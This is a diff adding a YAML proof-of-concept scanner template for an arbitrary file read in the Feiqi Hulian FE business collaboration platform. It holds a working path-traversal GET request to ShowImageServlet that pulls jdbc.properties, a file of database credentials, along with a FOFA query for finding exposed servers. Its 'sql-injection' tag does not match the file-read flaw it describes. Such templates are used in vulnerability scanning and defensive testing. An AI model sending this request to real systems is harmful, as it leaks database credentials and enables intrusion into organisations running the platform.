@@ -1,0 +1,16 @@
+id: poc-yaml-fqhl--FE-business-assistance-platform-showimageservlet-file-read
+info:
+  name: 飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+requests:
+- method: GET
+  path: /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
+  expression: status_code == 200 && contains(body,"com.microsoft.sqlserver.jdbc.SQLServerDriver")
+    && contains(body,"mssql.jdbc.user=") && contains(body,"edit database ip;odbc")
+    && content_type == "image/*"
+variables: {}
+transport: http
